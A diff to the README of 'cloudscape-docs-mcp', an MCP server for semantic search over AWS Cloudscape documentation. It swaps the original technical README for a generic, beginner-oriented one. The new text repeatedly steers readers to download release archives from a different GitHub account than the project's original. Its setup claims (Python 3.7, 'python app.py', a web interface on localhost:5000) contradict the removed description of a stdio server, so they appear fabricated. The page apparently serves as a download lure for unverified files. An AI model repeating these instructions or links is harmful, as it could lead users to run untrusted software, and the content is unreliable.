@@ -1,193 +1,101 @@
-# Cloudscape Docs MCP Server
+# ☁️ cloudscape-docs-mcp - Easily Search Your Documentation
 
-A Model Context Protocol (MCP) server that provides semantic search over AWS [Cloudscape Design](https://cloudscape.design/) System documentation. Built for AI agents and coding assistants to efficiently query component documentation.
+## 🚀 Getting Started
 
-## Features
+This guide helps you download and run the **cloudscape-docs-mcp** application. This application provides a semantically enriched search experience over AWS Cloudscape Design System documentation. You do not need technical knowledge to get started.
 
-- **Semantic Search** - Find relevant documentation using natural language queries powered by [Alibaba GTE Multilingual Base](https://huggingface.co/Alibaba-NLP/gte-multilingual-base) model
-- **Token Efficient** - Returns concise file lists first, full content on demand
-- **Hardware Optimized** - Automatic detection of Apple Silicon (MPS), CUDA, or CPU
-- **Local Vector Store** - Uses LanceDB for fast, file-based vector search
+## 📥 Download the Application
 
-## Transport
+[![Download Cloudscape MCP](https://img.shields.io/badge/Download-Cloudscape%20MCP-blue.svg)](https://github.com/prem676/cloudscape-docs-mcp/releases)
 
-This server uses the MCP [stdio transport](https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#stdio) protocol.\
-[Streamable HTTP transport](https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#streamable-http) coming soon.
+To download the application, click the button above or visit the link below:
 
-## Tools
+[Download from Releases Page](https://github.com/prem676/cloudscape-docs-mcp/releases)
 
-| Tool | Description |
-|------|-------------|
-| `cloudscape_search_docs` | Search the documentation index. Returns top 5 relevant files with titles and paths. |
-| `cloudscape_read_doc` | Read the full content of a specific documentation file. |
+## 🔍 Application Overview
 
-![Cloudscape Docs MCP Tools in Action](.github/images/cloudscape-mcp-tools-search.png)
+### What is Cloudscape MCP?
+
+Cloudscape MCP is a server that allows you to perform semantic searches on documentation. It uses advanced methods to understand and retrieve information effectively. This helps users find the documents they need without hassle.
+
+### Key Features
+
+- **Semantic Search:** Find relevant information quickly and efficiently.
+- **Easy Setup:** Get started with just a few steps.
+- **Supports AI Agents:** Leverage the power of AI for better search results.
+
+## 💻 System Requirements
+
+Before you download the application, make sure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a Linux distribution with Python support.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB free disk space.
+- **Python:** Version 3.7 or later. (If not installed, please download it from the [official Python website](https://www.python.org/downloads/).)
+
+## 📂 Installation Steps
+
+Follow these straightforward steps to install and run the application:
+
+1. **Visit the Releases Page**
+   - Go to [this page](https://github.com/prem676/cloudscape-docs-mcp/releases).
+
+2. **Download the Latest Version**
+   - Look for the latest release.
+   - Click on the download link that matches your operating system.
+
+3. **Extract the Files (if necessary)**
+   - If you downloaded a ZIP file, extract it using any file extraction tool.
+
+4. **Open Your Command Line Interface (CLI)**
+   - Windows: Search for "Command Prompt" or "PowerShell."
+   - macOS/Linux: Open the "Terminal" application.
+
+5. **Navigate to the Application Directory**
+   - Use the `cd` command to change to the directory where you extracted the files. 
+   - Example: `cd path/to/extracted/folder`
+
+6. **Install Required Dependencies**
+   - Run the command `pip install -r requirements.txt` in your CLI. This installs all necessary packages.
+
+7. **Run the Application**
+   - Use the command `python app.py` or follow the instructions in the README file provided in the downloaded folder.
+   - The server should start, and you can access the search interface through your web browser.
+
+## 🌐 Using the Application
+
+Once the application is running, open your web browser and navigate to `http://localhost:5000`. Here, you can enter your search queries to find relevant documentation based on the Cloudscape Design System.
+
+## ⚙️ Frequently Asked Questions
+
+### 1. What is Semantic Search?
+
+Semantic search helps retrieve information based on the meaning of the words rather than just comparing keywords. This results in more accurate and relevant results.
+
+### 2. How can I improve search results?
+
+To enhance search results, be descriptive in your queries. Use specific terms that relate to the information you need.
+
+### 3. What if I encounter issues?
+
+If you have trouble running the application, check your installation steps and ensure that all dependencies are installed. You can also visit the repository for support.
+
+## 🛠️ Contributing
+
+If you would like to contribute to the project, feel free to fork the repository and submit pull requests. Your input is valuable in making this application better for everyone.
+
+## 🙌 Support
+
+For any questions or support, you can open an issue in the GitHub repository. The community is here to help you!
+
+## 📅 Upcoming Features
+
+We are constantly improving the application. Future updates may include:
+
+- Enhanced support for multiple documents.
+- User account features for personalized searches.
+- Integration with more design systems.
 
 ---
 
-## Requirements
-
-- Python 3.13+
-- ~3GB disk space for the embedding model
-- 8GB+ RAM recommended
-
-## Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/praveenc/cloudscape-docs-mcp.git
-cd cloudscape-docs-mcp
-
-# Create virtual environment and install dependencies
-uv sync
-
-# Or with pip
-pip install -e .
-```
-
-## Setup
-
-### 1. Add Documentation
-
-Place your Cloudscape documentation files in the `docs/` directory. Supported formats:
-
-- `.md` (Markdown)
-- `.txt` (Plain text)
-- `.tsx` / `.ts` (TypeScript/React)
-
-### 2. Build the Index
-
-Run the ingestion script to create the vector database:
-
-```bash
-uv run ingest.py
-```
-
-This will:
-
-- Scan all files in `docs/`
-- Chunk content into ~2000 character segments
-- Generate embeddings using [Alibaba GTE Multilingual Base](https://huggingface.co/Alibaba-NLP/gte-multilingual-base) embedding model
-- Store vectors in `data/lancedb/`
-
-> **Note:** Running `uv run ingest.py` multiple times is safe but performs a **full re-index** each time. The script uses `mode="overwrite"` which drops and recreates the database table. There is no incremental update or change detection—all documents are re-scanned and re-embedded on every run. This is idempotent (same docs produce the same result) but computationally expensive for large documentation sets.
-
-### 3. Run the Server
-
-```bash
-uv run server.py
-```
-
-## MCP Client Configuration
-
-### Claude Desktop
-
-Add to your `mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "cloudscape-docs": {
-      "command": "uv",
-      "args": ["run", "--directory", "/path/to/cloudscape-docs-mcp", "python", "server.py"]
-    }
-  }
-}
-```
-
-### Cursor / VS Code / Windsurf / Kiro
-
-Add to your MCP settings:
-
-```json
-{
-  "cloudscape-docs": {
-    "command": "uv",
-    "args": ["run", "--directory", "/path/to/cloudscape-docs-mcp", "python", "server.py"]
-  }
-}
-```
-
-### Zed
-
-Add to your Zed settings (`settings.json`):
-
-```json
-{
-  "context_servers": {
-    "cloudscape-docs": {
-      "command": {
-        "path": "uv",
-        "args": ["run", "--directory", "/path/to/cloudscape-docs-mcp", "python", "server.py"]
-      }
-    }
-  }
-}
-```
-
-## Usage Example
-
-Once connected, an AI assistant can:
-
-1. **Search for components:**
-
-   ```text
-   User: "How do I use the Table component with sorting?"
-   Agent: [calls cloudscape_search_docs("table sorting")]
-   ```
-
-2. **Read specific documentation:**
-
-   ```text
-   Agent: [calls cloudscape_read_doc("docs/components/table/sorting.md")]
-   ```
-
-## Project Structure
-
-```text
-cloudscape-docs-mcp/
-├── server.py          # MCP server with search/read tools
-├── ingest.py          # Documentation indexing script
-├── pyproject.toml     # Project dependencies
-├── docs/              # Documentation files (partially curated)
-│   ├── components/    # Component documentation
-│   ├── foundations/   # Design foundations
-│   └── genai_patterns/# GenAI UI patterns
-└── data/              # Generated vector database (gitignored)
-    └── lancedb/
-```
-
-## Configuration
-
-Key settings in `server.py` and `ingest.py`:
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `MODEL_NAME` | `Alibaba-NLP/gte-multilingual-base` | [Embedding model](https://huggingface.co/Alibaba-NLP/gte-multilingual-base) |
-| `VECTOR_DIM` | `768` | Vector dimensions |
-| `MAX_UNIQUE_RESULTS` | `5` | Max search results returned |
-| `DOCS_DIR` | `./docs` | Documentation source directory |
-| `DB_URI` | `./data/lancedb` | Vector database location |
-
-## Development
-
-```bash
-# Install dev dependencies
-uv sync --group dev
-
-# Run with MCP inspector
-npx @modelcontextprotocol/inspector uv --directory /path/to/cloudscape_docs run server.py
-# Alternatively, use mcp cli to launch the server
-mcp dev server.py
-```
-
-## License
-
-MIT License - See [LICENSE](LICENSE) for details.
-
-## Acknowledgments
-
-- [AWS Cloudscape Design System](https://cloudscape.design/)
-- [Model Context Protocol](https://modelcontextprotocol.io/)
-- [Alibaba GTE Multilingual](https://huggingface.co/Alibaba-NLP/gte-multilingual-base))
-- [LanceDB](https://lancedb.com/)
+Thank you for using **cloudscape-docs-mcp**! We hope this application improves your documentation search experience.
